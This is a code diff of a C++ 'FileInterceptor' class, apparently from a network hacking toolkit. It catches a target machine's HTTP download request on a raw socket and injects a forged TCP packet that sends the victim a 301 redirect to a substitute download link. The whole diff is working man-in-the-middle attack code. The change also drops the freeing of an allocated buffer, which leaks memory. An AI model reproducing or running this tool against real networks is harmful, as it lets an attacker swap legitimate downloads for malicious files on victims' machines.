@@ -5,24 +5,33 @@
 #include <cstring>
 #include <poll.h>
 #include <arpa/inet.h>
+#include <netinet/ip.h>
 
 CHaks::FileInterceptor::FileInterceptor() :
     requestAckNum(0),
-    requestFiltered(FALSE)
+    requestFiltered(FALSE),
+    ipVersion(0)
 {
 
 }
 
 CHaks::FileInterceptor::~FileInterceptor()
 {
-    
+
 }
 
-int CHaks::FileInterceptor::Run(const int socketFd, const char* interfaceName, const uint32_t ipVersion, const char* targetIP, 
+int CHaks::FileInterceptor::Init(const uint32_t ipVersion)
+{
+    this->ipVersion = ipVersion;
+
+    return NO_ERROR;
+}
+
+int CHaks::FileInterceptor::Run(const int socketFd, const char* interfaceName, const char* targetIP, 
     const char* downloadLink, const char* newDownloadLink)
 {
     pollfd pollFds[2]{};
-        
+
     // we want to monitor console input, entering something there stops the program
     pollFds[0].fd = 0;
     pollFds[0].events = POLLIN;
@@ -56,23 +65,40 @@ int CHaks::FileInterceptor::Run(const int socketFd, const char* interfaceName, c
                 return NO_ERROR;
             }
             else if(pollFds[1].revents & POLLIN)
-            {                
-                if(FilterRequest(socketFd, ipVersion, targetIP, downloadLink, httpRequestPacket) == NO_ERROR)
+            {   
+                // NOTE: requestAckNum gets set in FilterRequest
+                if(FilterRequest(socketFd, targetIP, downloadLink, httpRequestPacket) == NO_ERROR)
                 {
+                    std::cout << "request filtered:\n";
+                    httpRequestPacket.Print();
                     requestFiltered = TRUE;
+
+                    EthHeader* reqEthHeader = (EthHeader*)httpRequestPacket.GetLayerStart(0);
+                    memcpy(requestEthHeader.ether_dhost, reqEthHeader->ether_dhost, ETH_ALEN);
+                    memcpy(requestEthHeader.ether_shost, reqEthHeader->ether_shost, ETH_ALEN);
+                    requestEthHeader.ether_type = reqEthHeader->ether_type;
                 }
 
                 if(requestFiltered == TRUE)
                 {
-                    if(FilterResponse(socketFd, ipVersion, targetIP, httpResponsePacket) == NO_ERROR)
+                    if(FilterResponse(socketFd, targetIP, httpResponsePacket) == NO_ERROR)
                     {
-                        std::cout << "response before modifying:\n";
+                        std::cout << "original response:\n";
                         httpResponsePacket.Print();
 
-                        ModifyResponse(httpResponsePacket, newDownloadLink);
+                        PacketCraft::Packet newResponse;
+                        CreateResponse(httpResponsePacket, newResponse, newDownloadLink);
 
-                        std::cout << "response after modifying:\n";
-                        httpResponsePacket.Print();
+                        std::cout << "new response:\n";
+                        newResponse.Print();
+
+                        if(newResponse.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
+                        {
+                            LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() errpr");
+                            return APPLICATION_ERROR;
+                        }
+
+                        requestFiltered = FALSE;
                     }
                 }
             }
@@ -80,7 +106,7 @@ int CHaks::FileInterceptor::Run(const int socketFd, const char* interfaceName, c
     }
 }
 
-int CHaks::FileInterceptor::FilterRequest(const int socketFd, const uint32_t ipVersion, const char* targetIP, const char* downloadLink, PacketCraft::Packet& httpRequestPacket)
+int CHaks::FileInterceptor::FilterRequest(const int socketFd, const char* targetIP, const char* downloadLink, PacketCraft::Packet& httpRequestPacket)
 {
     if(httpRequestPacket.Receive(socketFd, 0) == APPLICATION_ERROR)
     {
@@ -167,7 +193,7 @@ int CHaks::FileInterceptor::FilterRequest(const int socketFd, const uint32_t ipV
     return APPLICATION_WARNING;
 }
 
-int CHaks::FileInterceptor::FilterResponse(const int socketFd, const uint32_t ipVersion, const char* targetIP, PacketCraft::Packet& httpResponsePacket)
+int CHaks::FileInterceptor::FilterResponse(const int socketFd, const char* targetIP, PacketCraft::Packet& httpResponsePacket)
 {
     if(httpResponsePacket.Receive(socketFd, 0) == APPLICATION_ERROR)
     {
@@ -225,19 +251,84 @@ int CHaks::FileInterceptor::FilterResponse(const int socketFd, const uint32_t ip
     return APPLICATION_WARNING;
 }
 
-int CHaks::FileInterceptor::ModifyResponse(PacketCraft::Packet& httpResponse, const char* newDownloadLink) const
+int CHaks::FileInterceptor::CreateResponse(const PacketCraft::Packet& originalResponse, PacketCraft::Packet& newResponse, const char* newDownloadLink) const
 {
+    newResponse.AddLayer(PC_ETHER_II, ETH_HLEN);
+    EthHeader* newResponseEthHeader = (EthHeader*)newResponse.GetLayerStart(0);
+    memcpy(newResponseEthHeader->ether_dhost, requestEthHeader.ether_shost, ETH_ALEN);
+    memcpy(newResponseEthHeader->ether_shost, requestEthHeader.ether_dhost, ETH_ALEN);
+    newResponseEthHeader->ether_type = requestEthHeader.ether_type;
+
+    if(ipVersion == AF_INET)
+    {
+        IPv4Header* originalResponseIPv4Header = (IPv4Header*)originalResponse.FindLayerByType(PC_IPV4);
+        newResponse.AddLayer(PC_IPV4, sizeof(IPv4Header));
+        IPv4Header* newResponseIPv4Header = (IPv4Header*)newResponse.FindLayerByType(PC_IPV4);
+        newResponseIPv4Header->ip_v = originalResponseIPv4Header->ip_v;
+        newResponseIPv4Header->ip_hl = 5;
+        newResponseIPv4Header->ip_tos = 0;
+        newResponseIPv4Header->ip_len = htons(0); // calculated after packet has been constructed completely
+        newResponseIPv4Header->ip_id = originalResponseIPv4Header->ip_id;
+        newResponseIPv4Header->ip_off = IP_DF;
+        newResponseIPv4Header->ip_ttl = originalResponseIPv4Header->ip_ttl;
+        newResponseIPv4Header->ip_p = originalResponseIPv4Header->ip_p;
+        newResponseIPv4Header->ip_sum = htons(0);
+        newResponseIPv4Header->ip_src.s_addr = originalResponseIPv4Header->ip_src.s_addr;
+        newResponseIPv4Header->ip_dst.s_addr = originalResponseIPv4Header->ip_dst.s_addr;
+    }
+    else
+    {
+        IPv6Header* originalResponseIPv6Header = (IPv6Header*)originalResponse.FindLayerByType(PC_IPV6);
+        newResponse.AddLayer(PC_IPV6, sizeof(IPv6Header));
+        IPv6Header* newResponseIPv6Header = (IPv6Header*)newResponse.FindLayerByType(PC_IPV6);
+        newResponseIPv6Header->ip6_ctlun.ip6_un1.ip6_un1_flow = originalResponseIPv6Header->ip6_ctlun.ip6_un1.ip6_un1_flow;
+        newResponseIPv6Header->ip6_ctlun.ip6_un1.ip6_un1_hlim = originalResponseIPv6Header->ip6_ctlun.ip6_un1.ip6_un1_hlim;
+        newResponseIPv6Header->ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_TCP;
+        newResponseIPv6Header->ip6_ctlun.ip6_un1.ip6_un1_plen = htons(0); // calculated after packet has been constructed completely
+        memcpy(newResponseIPv6Header->ip6_src.__in6_u.__u6_addr8, originalResponseIPv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN);
+        memcpy(newResponseIPv6Header->ip6_dst.__in6_u.__u6_addr8, originalResponseIPv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN);
+    }
+
+    TCPHeader* originalResponseTCPHeader = (TCPHeader*)originalResponse.FindLayerByType(PC_TCP);
+    newResponse.AddLayer(PC_TCP, sizeof(TCPHeader));
+    TCPHeader* newResponseTCPHeader = (TCPHeader*)newResponse.FindLayerByType(PC_TCP);
+    newResponseTCPHeader->source = originalResponseTCPHeader->source;
+    newResponseTCPHeader->dest = originalResponseTCPHeader->dest;
+    newResponseTCPHeader->seq = originalResponseTCPHeader->seq;
+    newResponseTCPHeader->ack_seq = originalResponseTCPHeader->ack_seq;
+    newResponseTCPHeader->doff = originalResponseTCPHeader->doff;
+    newResponseTCPHeader->res1 = originalResponseTCPHeader->res1;
+    newResponseTCPHeader->fin = originalResponseTCPHeader->fin;
+    newResponseTCPHeader->syn = originalResponseTCPHeader->syn;
+    newResponseTCPHeader->rst = originalResponseTCPHeader->rst;
+    newResponseTCPHeader->psh = originalResponseTCPHeader->psh;
+    newResponseTCPHeader->ack = originalResponseTCPHeader->ack;
+    newResponseTCPHeader->urg = originalResponseTCPHeader->urg;
+    newResponseTCPHeader->res2 = originalResponseTCPHeader->res2;
+    newResponseTCPHeader->window = originalResponseTCPHeader->window;
+    newResponseTCPHeader->check = htons(0);
+    newResponseTCPHeader->urg_ptr = originalResponseTCPHeader->urg_ptr;
+
     const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
     uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
     char* fullHTTPCode = (char*)malloc(responseCodeLen);
     PacketCraft::ConcatStr(fullHTTPCode, responseCodeLen, httpStatusCode, newDownloadLink);
 
-    httpResponse.DeleteLayer(httpResponse.GetNLayers() - 1);
-    httpResponse.AddLayer(PC_HTTP_RESPONSE, responseCodeLen);
-    memcpy(httpResponse.GetLayerStart(httpResponse.GetNLayers() - 1), fullHTTPCode, responseCodeLen);
+    newResponse.AddLayer(PC_HTTP_RESPONSE, responseCodeLen - 1);
+    memcpy(newResponse.GetLayerStart(newResponse.GetNLayers() - 1), fullHTTPCode, responseCodeLen - 1);
 
-    httpResponse.CalculateChecksums();
+    if(ipVersion == AF_INET)
+    {
+        IPv4Header* ipv4Header = (IPv4Header*)newResponse.FindLayerByType(PC_IPV4);
+        ipv4Header->ip_len = htons(newResponse.GetSizeInBytes() - ETH_HLEN);
+    }
+    else
+    {
+        IPv6Header* ipv6Header = (IPv6Header*)newResponse.FindLayerByType(PC_IPV6);
+        ipv6Header->ip6_ctlun.ip6_un1.ip6_un1_plen = htons(newResponse.GetSizeInBytes() - sizeof(EthHeader) - sizeof(IPv6Header)); // TODO: test
+    }
 
-    free(fullHTTPCode);
+    newResponse.CalculateChecksums();
+
     return NO_ERROR;
 }
